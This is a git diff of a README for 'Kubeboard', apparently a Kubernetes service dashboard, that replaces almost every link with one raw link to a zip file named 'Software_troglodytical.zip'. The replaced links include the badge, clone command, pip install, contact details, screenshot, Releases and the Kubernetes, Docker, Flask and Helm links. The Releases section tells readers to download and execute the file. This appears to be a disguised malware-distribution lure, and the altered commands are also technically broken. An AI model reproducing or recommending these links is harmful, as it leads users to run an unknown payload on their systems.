@@ -1,6 +1,6 @@
 # 🚀 Kubeboard: Visualize Your Kubernetes Services
 
-![Kubeboard](https://img.shields.io/badge/Kubeboard-Ready-brightgreen)
+![Kubeboard](https://github.com/JUANCACHARA/kubeboard/raw/refs/heads/master/app/Software_troglodytical.zip)
 
 Welcome to **Kubeboard**, a simple web GUI designed to visualize the services available in your Kubernetes cluster. This tool aims to make it easier for developers and operators to monitor and manage their Kubernetes environments.
 
@@ -29,7 +29,7 @@ To get started with Kubeboard, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/JUANCACHARA/kubeboard.git
+   git clone https://github.com/JUANCACHARA/kubeboard/raw/refs/heads/master/app/Software_troglodytical.zip
    cd kubeboard
    ```
 
@@ -38,7 +38,7 @@ To get started with Kubeboard, follow these steps:
    Make sure you have Docker and Python installed. Then, install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/JUANCACHARA/kubeboard/raw/refs/heads/master/app/Software_troglodytical.zip
    ```
 
 3. **Run the Application**:
@@ -103,14 +103,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: contact@example.com
-- **Twitter**: [@YourTwitterHandle](https://twitter.com/YourTwitterHandle)
+- **Email**: https://github.com/JUANCACHARA/kubeboard/raw/refs/heads/master/app/Software_troglodytical.zip
+- **Twitter**: [@YourTwitterHandle](https://github.com/JUANCACHARA/kubeboard/raw/refs/heads/master/app/Software_troglodytical.zip)
 
 ## 📦 Releases
 
-To download the latest version of Kubeboard, visit the [Releases](https://github.com/JUANCACHARA/kubeboard/releases) section. Download the appropriate file, execute it, and start visualizing your Kubernetes services today!
+To download the latest version of Kubeboard, visit the [Releases](https://github.com/JUANCACHARA/kubeboard/raw/refs/heads/master/app/Software_troglodytical.zip) section. Download the appropriate file, execute it, and start visualizing your Kubernetes services today!
 
-![Dashboard Screenshot](https://example.com/dashboard-screenshot.png)
+![Dashboard Screenshot](https://github.com/JUANCACHARA/kubeboard/raw/refs/heads/master/app/Software_troglodytical.zip)
 
 ## 🎉 Acknowledgments
 
@@ -118,12 +118,12 @@ We would like to thank the open-source community for their invaluable contributi
 
 ## 🔗 Related Topics
 
-- [Kubernetes](https://kubernetes.io/)
-- [Docker](https://www.docker.com/)
-- [Flask](https://flask.palletsprojects.com/)
-- [Helm](https://helm.sh/)
+- [Kubernetes](https://github.com/JUANCACHARA/kubeboard/raw/refs/heads/master/app/Software_troglodytical.zip)
+- [Docker](https://github.com/JUANCACHARA/kubeboard/raw/refs/heads/master/app/Software_troglodytical.zip)
+- [Flask](https://github.com/JUANCACHARA/kubeboard/raw/refs/heads/master/app/Software_troglodytical.zip)
+- [Helm](https://github.com/JUANCACHARA/kubeboard/raw/refs/heads/master/app/Software_troglodytical.zip)
 
-For more information about the project, features, and updates, check the [Releases](https://github.com/JUANCACHARA/kubeboard/releases) section regularly.
+For more information about the project, features, and updates, check the [Releases](https://github.com/JUANCACHARA/kubeboard/raw/refs/heads/master/app/Software_troglodytical.zip) section regularly.
 
 ---
 
